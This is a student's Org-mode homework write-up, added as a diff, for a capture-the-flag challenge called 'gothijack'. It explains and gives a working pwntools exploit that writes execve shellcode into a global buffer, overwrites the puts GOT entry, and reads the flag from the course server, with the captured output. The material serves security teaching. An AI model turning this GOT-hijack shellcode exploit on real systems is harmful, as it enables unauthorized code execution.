@@ -1,0 +1,61 @@
+#+OPTIONS: ':nil *:t -:t ::t <:t H:3 \n:nil ^:t arch:headline author:t
+#+OPTIONS: broken-links:nil c:nil creator:nil d:(not "LOGBOOK") date:t e:t
+#+OPTIONS: email:nil f:t inline:t num:t p:nil pri:nil prop:nil stat:t tags:t
+#+OPTIONS: tasks:t tex:t timestamp:t title:t toc:t todo:t |:t
+#+TITLE: hw2
+#+AUTHOR: 0410788 CHING-WEN CHENG
+#+LANGUAGE: en
+#+SELECT_TAGS: export
+#+EXCLUDE_TAGS: noexport
+#+CREATOR: Emacs 25.2.2 (Org mode 9.0.9)
+#+LATEX_CLASS: article
+#+LATEX_CLASS_OPTIONS:
+#+LATEX_HEADER:
+#+LATEX_HEADER_EXTRA:
+#+DESCRIPTION:
+#+KEYWORDS:
+#+SUBTITLE:
+#+LATEX_COMPILER: pdflatex
+
+* Homework2
+** gothijack
+   no nx & PIE, we can insert shellcode to global variable <name> and at the second input 
+   write <puts> got to <name>'s address, so when the last puts is called, shellcode is executed.
+*** Code
+#+BEGIN_SRC python :results output :python  ~/pyenv/bin/python3 :exports both
+from pwn import *
+context.arch = "amd64"
+puts_got = 0x601020
+buf = 0x6010a0
+payload = b"\x00" * 8
+shell = asm("""
+call main
+.ascii "/bin/sh"
+.byte 0
+
+main:
+  mov rax, 59
+  mov rdi, [rsp]
+  mov rdx, 0
+  mov rsi, 0
+  syscall
+""")
+r = remote("csie.ctf.tw", 10129)
+r.recvuntil(":")
+r.send(payload + shell)
+r.recvuntil(":")
+r.sendline(hex(puts_got))
+r.recvuntil(":")
+r.sendline(p64(buf+8))
+r.sendline("cat /home/`whoami`/flag")
+f = r.recvline()
+print(f)
+
+#+END_SRC
+
+#+RESULTS:
+: [x] Opening connection to csie.ctf.tw on port 10129
+: [x] Opening connection to csie.ctf.tw on port 10129: Trying 140.112.31.96
+: [+] Opening connection to csie.ctf.tw on port 10129: Done
+: b'FLAG{G0THiJJack1NG}\n'
+: [*] Closed connection to csie.ctf.tw port 10129
